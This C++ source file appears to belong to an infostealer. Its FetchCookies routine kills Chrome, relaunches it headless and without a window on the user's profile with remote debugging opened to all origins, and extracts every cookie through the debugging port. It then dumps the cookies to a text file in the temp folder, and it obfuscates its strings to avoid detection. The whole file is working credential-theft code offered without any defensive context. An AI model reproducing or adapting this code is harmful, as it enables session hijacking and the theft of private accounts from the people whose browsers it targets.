/*

*/


#include "utilities.hpp"
#include "cookie_fetcher.hpp"
#include "obfusheader.h" 

void FetchCookies(const wstring browserPath, const wstring userData) {
    TerminateChromeProcesses(OBF(L"chrome.exe"));  
    int port = GeneratePort();

    wstring cmdLine = OBF(L"\"") + browserPath + OBF(L"\" --headless ") +
        OBF(L"--user-data-dir=\"") + userData + OBF(L"\" ") +
        OBF(L"--remote-debugging-port=") + to_wstring(port) + OBF(L" ") +
        OBF(L"--remote-allow-origins=* ") +
        OBF(L"--disable-extensions --no-sandbox --disable-gpu");

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    vector<wchar_t> cmdLineVec(cmdLine.begin(), cmdLine.end());
    cmdLineVec.push_back(L'\0');

    if (!CreateProcessW(browserPath.c_str(), cmdLineVec.data(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) return;

    bool portReady = false;
    for (int i = 0; i < 60; ++i) {
        if (!IsPortAvailable(port)) {
            portReady = true;
            break;
        }
        Sleep(100);
    }

    if (!portReady) {
        TerminateProcess(pi.hProcess, 0);
        return;
    }

    string cookies = FetchCookies(port);

    if (!cookies.empty()) {
        wstring tempPath(MAX_PATH, L'\0');
        GetTempPathW(MAX_PATH, &tempPath[0]);
        tempPath = tempPath.c_str();  
        
        wstring filePath = tempPath + OBF(L"\\cookies_dump.txt"); 
        HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, cookies.c_str(), (DWORD)cookies.size(), &written, NULL);
            CloseHandle(hFile);
        }
    }

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
